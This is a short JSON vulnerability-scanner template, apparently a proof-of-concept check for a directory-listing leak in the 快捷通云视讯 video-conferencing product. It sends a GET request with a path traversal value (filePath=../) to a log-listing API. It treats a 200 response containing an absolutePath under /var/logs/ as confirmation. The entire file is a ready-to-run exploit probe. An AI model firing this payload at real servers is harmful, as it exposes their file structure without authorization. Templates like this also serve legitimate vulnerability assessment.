{
    "Name": "快捷通云视讯directory-file-leak.json",
    "Description": "快捷通云视讯directory-file-leak.json",
    "Product": "快捷通",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/him/api/rest/V1.0/system/log/list?filePath=../",
        "Port":"",
        "Data":"",
        "follow_redirects":"false",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "\"absolutePath\":\"/var/logs/"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":"" }
            ]}